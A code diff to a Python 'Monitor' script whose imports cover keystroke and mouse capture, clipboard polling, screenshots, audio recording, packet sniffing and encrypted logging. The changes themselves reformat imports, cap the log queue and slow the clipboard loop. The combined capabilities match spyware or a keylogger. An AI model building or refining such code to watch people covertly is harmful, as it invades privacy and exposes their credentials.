@@ -1,18 +1,19 @@
 # Import required libraries
-import threading           # For creating threads
-import json                 # For JSON formatting
-import logging.config       # For logging configuration
-import queue                # For using queues
-import pyperclip            # For clipboard interaction
-import pyautogui            # For taking screenshots
-import sounddevice as sd    # For recording audio
-import wavio                # For saving audio in WAV format
+import threading  # For creating threads
+import json  # For JSON formatting
+import logging.config  # For logging configuration
+import queue  # For using queues
+import pyperclip  # For clipboard interaction
+import pyautogui  # For taking screenshots
+import sounddevice as sd  # For recording audio
+import wavio  # For saving audio in WAV format
 from pynput import keyboard, mouse  # For monitoring keyboard and mouse events
 from scapy.all import sniff, TCP, UDP  # For network packet sniffing
 from cryptography.fernet import Fernet  # For encryption
-import configparser         # For reading INI files
-import signal               # For signal handling
-import time                 # For time-related operations
+import configparser  # For reading INI files
+import signal  # For signal handling
+import sys  # For system operations, including graceful shutdown
+import time  # For time-related operations
 from contextlib import contextmanager  # For creating context managers
 from logging.handlers import RotatingFileHandler  # For rotating log files
 
@@ -66,7 +67,8 @@ class Monitor:
 
     # Function to log data
     def log(self, data):
-        self.log_queue.put(data)  # Put data into queue
+        if not self.log_queue.full():
+            self.log_queue.put(data)  # Put data into queue
 
     # Function to encrypt data
     def encrypt(self, data):
@@ -78,6 +80,7 @@ class Monitor:
 def monitor_clipboard(monitor):
     recent_value = pyperclip.paste()  # Get the current clipboard value
     while True:
+        time.sleep(1)  # Prevent tight loop, add slight delay
         tmp_value = pyperclip.paste()  # Get the new clipboard value
         if tmp_value != recent_value:  # If it has changed
             recent_value = tmp_value  # Update the recent value
